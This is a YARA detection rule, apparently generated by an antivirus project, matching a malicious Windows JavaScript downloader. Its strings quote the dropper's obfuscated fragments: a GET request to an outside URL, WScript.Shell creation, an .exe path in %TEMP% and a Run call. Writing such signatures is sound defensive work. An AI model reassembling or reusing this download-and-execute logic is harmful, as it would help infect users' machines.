rule sig_20160401_c98eabffb986c78b30a6caf359cdfb61 {
  meta:
    description = "datamaliciousorder - file 20160401_c98eabffb986c78b30a6caf359cdfb61.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e34f74010cb77a0f0b27cec58b00b8769ee1109170466690e68c22cd7ba19cc5"

  strings:
    $s1  = "FebFzx[RjmOa](\"G\" + \"ET\", \"http://langeparis.com.au/s0powa\", false);" fullword ascii
    $s2  = "function QvHby(DkIx, GoHk){GkcUaq = GkcUaq * 1; return DkIx - GoHk;};" fullword ascii
    $s3  = "var SkEsd = function KiDw() {return WScript[DykFbh](\"WScript\"+\".Shell\");}(), TbGy = 11;" fullword ascii
    $s4  = "if (FebFzx[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function MwBcx() {return SkEsd[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"rmWFLvHva.ex\" + \"e\";};" fullword ascii
    $s6  = "function KuqCb(){return IgbGh + \"\";};" fullword ascii
    $s7  = "function JokKu() {return ((OkjAy == true) && (OkjAy == EiOxf)) ? 1 : GkcUaq;};" fullword ascii
    $s8  = "function QktCxu()" fullword ascii
    $s9  = "function ZeCdd(){return 23;};" fullword ascii
    $s10 = "function UhwWby(HxnBwe) {var HvdGv = (1, 2, 3, 4, 5, HxnBwe); return HvdGv;};" fullword ascii
    $s11 = "var OkjAy = false;" fullword ascii
    $s12 = "function XuyYdl(NqeCoi){SkEsd[\"R\"+\"un\"](NqeCoi, GkcUaq, GkcUaq);};" fullword ascii
    $s13 = "var QjVpc = false;" fullword ascii
    $s14 = "EiOxf = true; " fullword ascii
    $s15 = "var EiOxf = false;" fullword ascii
    $s16 = "var CfZhi = new this[\"Date\"]();" fullword ascii
    $s17 = "function UoxMue(){return DykFbh;};" fullword ascii
    $s18 = "}while (BbrJxg);" fullword ascii
    $s19 = "return QvHby(OmJmk, LipQl);" fullword ascii
    $s20 = "OkjAy = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}